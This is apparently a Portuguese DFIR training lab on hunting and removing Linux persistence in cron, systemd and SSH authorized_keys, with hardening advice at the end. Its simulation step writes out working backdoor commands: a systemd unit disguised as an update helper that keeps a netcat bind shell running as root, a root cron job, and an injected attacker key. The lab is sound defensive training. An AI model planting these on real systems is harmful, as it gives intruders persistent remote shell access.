# 🕵️‍♂️ Lab 12: Auditoria Forense de Mecanismos de Persistência no Linux (Threat Hunting & Artifacts)

## 📌 Visão Geral
Após comprometer um host, agentes maliciosos estabelecem mecanismos de persistência para assegurar acesso recorrente ao ambiente, mesmo após reinicializações do sistema ou encerramento de processos em memória. Este laboratório aborda a investigação forense dos três vetores mais explorados no Linux: tarefas agendadas no **Cron**, unidades de serviço no **Systemd** e injeção de chaves públicas em **SSH Authorized Keys**.

---

## 🎯 Objetivos Técnicos
* Mapear e auditar diretórios de agendamento do sistema (`/etc/cron*`) e tabelas de usuários (`/var/spool/cron/crontabs/`).
* Detectar arquivos de serviço customizados não homologados no diretório `/etc/systemd/system/`.
* Auditar chaves autorizadas em `~/.ssh/authorized_keys` para identificar backdoors de acesso remoto.
* Executar os procedimentos de resposta a incidentes para remoção e erradicação dos artefatos.

---

## 🧪 Topologia e Ferramentas
* **Ambiente:** Kali Linux
* **Vetores Analisados:** Cron Jobs, Systemd Services, SSH Authorized Keys
* **Comandos Forenses:** `ls -la`, `cat`, `systemctl`, `sed`, `rm`

---

## 🚀 Passo a Passo Prático

### 1. Simulação dos Vetores de Persistência
Criação controlada de artefatos maliciosos nos principais pontos de persistência do sistema:

```bash
# 1. Agendamento de execução periódica de script malicioso via Cron
echo "* * * * * root /tmp/malicious_beacon.sh" | sudo tee /etc/cron.d/persistence_job

# 2. Criação de serviço Systemd para abertura persistente de porta em segundo plano
sudo tee /etc/systemd/system/backdoor.service > /dev/null << 'EOF'
[Unit]
Description=Legitimate System Update Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/nc -lvnp 5555 -e /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 3. Injeção de chave SSH pública de atacante externo
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCattacker_fake_key_persistency_test== attacker@c2server" >> ~/.ssh/authorized_keys
```

---

### 2. Threat Hunting: Auditoria do Subsistema Cron
Varredura de todos os diretórios de spool e tabelas de agendamento:

```bash
sudo ls -la /etc/cron* /var/spool/cron/crontabs/
cat /etc/cron.d/persistence_job
```

**Evidência Coletada:**
```text
/etc/cron.d:
-rw-r--r-- 1 root root  40 Aug 31 01:47 persistence_job

Conteúdo do arquivo:
* * * * * root /tmp/malicious_beacon.sh
```

---

### 3. Threat Hunting: Auditoria de Serviços Systemd
Inspeção de unit files locais criados fora do repositório padrão de pacotes (`/etc/systemd/system/`):

```bash
cat /etc/systemd/system/backdoor.service
```

**Evidência Coletada:**
```ini
[Unit]
Description=Legitimate System Update Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/nc -lvnp 5555 -e /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target
```

---

### 4. Threat Hunting: Auditoria de Chaves SSH (`authorized_keys`)
Verificação de chaves públicas autorizadas para login sem senha:

```bash
cat ~/.ssh/authorized_keys
```

**Evidência Coletada:**
```text
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCattacker_fake_key_persistency_test== attacker@c2server
```

---

### 5. Erradicação e Contenção dos Artefatos Maliciosos
Remoção dos arquivos de persistência e expurgo da chave pública não autorizada:

```bash
# Remover job do cron e serviço malicioso
sudo rm -f /etc/cron.d/persistence_job /etc/systemd/system/backdoor.service

# Excluir a chave do invasor do authorized_keys
sed -i '/attacker@c2server/d' ~/.ssh/authorized_keys

# Recarregar tabelas do systemd
sudo systemctl daemon-reload
```

---

## 🛡️ Recomendações e Lições Aprendidas (Blue Team / DFIR)
1. **Auditoria Contínua de Cron:** Monitorar modificações em `/etc/crontab`, `/etc/cron.*` e `/var/spool/cron/` via regras de integridade (AIDE/auditd).
2. **Camuflagem no Systemd:** Invasores frequentemente nomeiam serviços falsos com nomes legítimos (ex: `System Update Helper`, `dbus-sync`) para dificultar a detecção em triagens rápidas.
3. **Hardening de SSH:** Desabilitar autenticação por senha, restringir permissões de `authorized_keys` (`chmod 600`) e auditar regularmente comentários e hashes de chaves autorizadas em todos os usuários do sistema.
